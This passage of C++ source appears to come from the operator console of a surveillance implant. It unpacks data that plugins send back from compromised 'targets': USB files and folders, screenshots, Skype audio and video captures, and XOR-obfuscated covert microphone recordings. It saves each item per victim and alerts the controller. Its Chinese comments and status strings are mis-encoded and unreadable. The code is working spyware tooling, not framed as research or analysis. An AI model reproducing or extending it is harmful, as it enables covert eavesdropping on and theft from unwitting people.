    HANDLE hFile = CreateFileA(aniPath.c_str(),
                              GENERIC_ALL,
                              FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL,
                              OPEN_EXISTING,
                              FILE_ATTRIBUTE_NORMAL,
                              NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        DeleteFileA(aniPath.c_str());
        return;
    }

    bool    bRet = false;
    DWORD   dwByteReaded;

    do
    {
        if ( ! ReadFile(hFile, &usbCommHeader, sizeof(USB_COMMON_HEADER), &dwByteReaded, NULL))
        {
            break;
        }

        if (dwByteReaded != sizeof(USB_COMMON_HEADER))
        {
            break;
        }

        if (usbCommHeader.dwPluginId != 3)
        {
            break;
        }
        
        if (usbCommHeader.dwMagic != USB_MAGIC)
        {
            break;
        }

        bRet = true;
        
    } while(false);

    if (bRet)
    {
        if (usbCommHeader.dwFileType == USB_FILE_FILE)
        {
            // ��ȡ����USB�ļ�

            ProcessUsbFile(hFile, tarBlock);
        }
        else if (usbCommHeader.dwFileType == USB_FILE_DIR)
        {
            // ��ȡ����USBĿ¼�ļ�
			if ( UnixLike(tarBlock) )
				ProcessUsbDirMac(hFile, tarBlock);
			else
				ProcessUsbDir(hFile, tarBlock);
        }
    }

    CloseHandle(hFile);    
    DeleteFileA(aniPath.c_str());

    return;
}
//---------------------------------------------------------------------------
void __fastcall ProcessScreenPluginData(FileTask *lpFileTask,  Target    *tarBlock)
{
    // �����ļ�����������Ŀ¼
    //
    WCHAR   wzNodeName[MAX_PATH];
    WCHAR   wzFileName[MAX_PATH];
    ZeroMemory(wzNodeName, MAX_PATH * sizeof(WCHAR));
    ZeroMemory(wzFileName, MAX_PATH * sizeof(WCHAR));
    ExportScreenFileToLocal(lpFileTask->aniTmpTaskPath.c_str(), tarBlock->wideScreenPath.c_str(), wzNodeName, wzFileName);
    DeleteFileA(lpFileTask->aniTmpTaskPath.c_str());
                                                
    // ֪ͨ������и���, ֻ�н�����ʾ��ʱ��Żؽ��и���
    //
    SendMessageToTarControlFrm(tarBlock, WM_UPDATE_SCREEN, (UINT)wzNodeName, (LONG)wzFileName);
}

// ����Ƶ�������
void ProcessMultimediaPluginData(FileTask *lpFileTask,  Target    *tarBlock)
{
	std::wstring file = AnsiToWide(lpFileTask->aniTmpTaskPath);

	HANDLE hFile = CreateFileW(
		file.c_str(),
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if ( INVALID_HANDLE_VALUE == hFile )
		return;

	SKYPE_FILE_HEADER header = {0};

	DWORD dwRead = 0;
	if ( !ReadFile(hFile, &header, sizeof(SKYPE_FILE_HEADER), &dwRead, NULL) )
	{
		CloseHandle(hFile);
		return;
	}

	if ( header.dwMagicNumber != 0xFF14FF14 )
	{
		CloseHandle(hFile);
		return;
	}

	std::wstring localPath = tarBlock->widMultimediaPath + L"\\Skype\\";
	CheckAndCreateDirectory(WideToAnsi(localPath).c_str());

	localPath += header.wzSaveTime;
	CheckAndCreateDirectory(WideToAnsi(localPath).c_str());

	std::wstring audioPath = localPath + L"\\audio";
	std::wstring videoPath = localPath + L"\\video";

	CheckAndCreateDirectory(WideToAnsi(audioPath).c_str());
	CheckAndCreateDirectory(WideToAnsi(videoPath).c_str());

	do 
	{
		SKYPE_SUB_FILE_HEADER header = {0};
		ReadFile(hFile, &header, sizeof(SKYPE_SUB_FILE_HEADER), &dwRead, NULL);

		if ( 0 == dwRead )
			break;
		
		char* buffer = new char[header.dwFileSize];

		dwRead = 0;
		while ( dwRead < header.dwFileSize )
		{
			DWORD perRead = 0;
			ReadFile(hFile, buffer + dwRead, header.dwFileSize - dwRead, &perRead, NULL);
			dwRead += perRead;
		}

		LPCWSTR fileName = wcsrchr(header.wzFileName, L'\\') + 1;
		std::wstring localPath;

		if ( 0 == header.dwFileType )
			localPath = videoPath + L"\\" + fileName;
		else
			localPath = audioPath + L"\\" + fileName;

		HANDLE localFile = CreateFileW(
			localPath.c_str(),
			GENERIC_WRITE,
			NULL,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

		if ( INVALID_HANDLE_VALUE == localFile )
		{
			delete [] buffer;
			break;
		}

		DWORD dwWrite = 0;
		while ( dwWrite < header.dwFileSize )
		{
			DWORD perWrite = 0;
			WriteFile(localFile, buffer + dwWrite, header.dwFileSize - dwWrite, &perWrite, NULL);
			dwWrite += perWrite;
		}

		CloseHandle(localFile);

		delete [] buffer;

	} while ( 1 );

	CloseHandle(hFile);

	DeleteFileA(lpFileTask->aniTmpTaskPath.c_str());

	if ( tarBlock->frmTarControl)
		SendMessageW(tarBlock->frmTarControl->Handle, WM_NEW_SKYPE_RECORD, 0, 0);

	SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��(ID:%d)] �ɹ���ȡ Skype ����Ƶ�������!", tarBlock->dwTargetID);
}

void ProcessBackSoundPluginData(FileTask* lpFileTask, Target* tarBlock)
{
	std::string tmpFile = lpFileTask->aniTmpTaskPath;

	HANDLE hf = CreateFileA(tmpFile.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if ( INVALID_HANDLE_VALUE == hf )
	{
		int err = GetLastError();
		return;
	}

	DWORD size = GetFileSize(hf, NULL);

	char* buffer = new char[size];
	memset(buffer, 0, size);

	DWORD readed = 0;
	ReadFile(hf, buffer, size, &readed, NULL);

	AdkXorMemory((PBYTE)buffer, 95, readed);

	AUDIO_PLUGIN_FILE* header = (AUDIO_PLUGIN_FILE*)buffer;

	if ( header->ullMagic != AUDIO_FILE_MAGIC )
	{
		delete [] buffer;
		CloseHandle(hf);
		return;
	}

	FILETIME	savetime;
	FILETIME    locSavetime;
	SYSTEMTIME	st;

	savetime = header->ftStartRecordTime;
	FileTimeToLocalFileTime(&savetime, &locSavetime);
	FileTimeToSystemTime(&locSavetime, &st);

	WCHAR timeStr[256] = {0};
	wsprintfW(timeStr, L"%.4d-%.2d-%.2d %.2d;%.2d;%.2d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
	
	int index = header->dwCurIndex;
	int total = header->dwTotalPieces;

	WCHAR newFileName[1024] = {0};
	wsprintfW(newFileName, L"%s\\%s-%s@%d.amr" ,tarBlock->widBackSoundPath.c_str(), header->dwFileType ? L"������" : L"¼��", timeStr, index);

	HANDLE hdst = CreateFileW(newFileName, FILE_GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	char* dstBuffer = new char[header->dwCurBlockSize*4];
	DWORD dstSize = header->dwCurBlockSize*4;

	int errid = g_zlibUncompress(
		(PBYTE)dstBuffer,
		&dstSize,
		(PBYTE)header->bData,
		header->dwCurBlockSize);

	DWORD written = 0;
	WriteFile(hdst, dstBuffer, dstSize, &written, NULL);

	if ( tarBlock->frmTarControl )
		SendMessageW((HWND)tarBlock->frmTarControl->winId(), WM_NEW_BACKSOUND, (WPARAM)newFileName, (LPARAM)lpFileTask->dwPluginID);

	delete [] buffer;
	delete [] dstBuffer;
	
	CloseHandle(hf);
	CloseHandle(hdst);

	return;
}

void ProcessThirdPluginData(FileTask *lpFileTask,  Target    *tarBlock)
{
	std::wstring tempFile = AnsiToWide(lpFileTask->aniTmpTaskPath);

	const wchar_t* filePath = lpFileTask->tarPathW.c_str();
	const wchar_t* fileName = wcsrchr(filePath, L'\\') + 1;

	WCHAR localDir[MAX_PATH] = {0};
	wsprintfW(localDir, L"%s\\%d", tarBlock->wid3rdFilePath.c_str(), lpFileTask->dwPluginID);
	CreateDirectoryW(localDir, NULL);

	WCHAR localPath[1024] = {0};
	wsprintfW(localPath, L"%s\\%d\\%s", tarBlock->wid3rdFilePath.c_str(), lpFileTask->dwPluginID, fileName);
	fileName = wcsrchr(localPath, L'\\') + 1;

	CopyFileW(tempFile.c_str(), localPath, FALSE);

	if ( tarBlock->frmTarControl )
		SendMessageW((HWND)tarBlock->frmTarControl->winId(), WM_NEW_THIRD_PLUGIN_FILE, (WPARAM)fileName, (LPARAM)lpFileTask->dwPluginID);

	SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��(ID:%d)] �ɹ���ȡ�ⲿ��� %d ������ : %s!", 
		tarBlock->dwTargetID, lpFileTask->dwPluginID, fileName);
}


//---------------------------------------------------------------------------
DWORD WINAPI ProcessPluginData(PVOID pContext)
{
    // ���ݲ�ͬ�Ĳ�����ͣ����ж�Ӧ����
    //
    FileTask *lpFileTask = (FileTask * )pContext;
    Target    *tarBlock = GetTargetFromGlobalMap(lpFileTask->dwTargetID);
        
    switch(lpFileTask->dwPluginID)
    {
    case 2:

        // �û���Ϊ����
        //
        ProcessUserPluginData(lpFileTask, tarBlock);
        break;

    case 3:
        
        // USB�������
        //
        ProcessUsbPluginData(lpFileTask, tarBlock);
        break;
            
    case 4:
        // ������Ļ��ز������
        //
        ProcessScreenPluginData(lpFileTask, tarBlock);
        break;

	case 5:
		// ����Ƶ���
		ProcessMultimediaPluginData(lpFileTask, tarBlock);
		break;

	case 6:
		// ������
		ProcessBackSoundPluginData(lpFileTask, tarBlock);
		break;

	default:
		ProcessThirdPluginData(lpFileTask, tarBlock);
		break;
    }
    
    if (tarBlock)
    {
        tarBlock->DeleteFileTask(lpFileTask);
    }
    else
    {
        delete lpFileTask;
    }
    
    return 0;
}

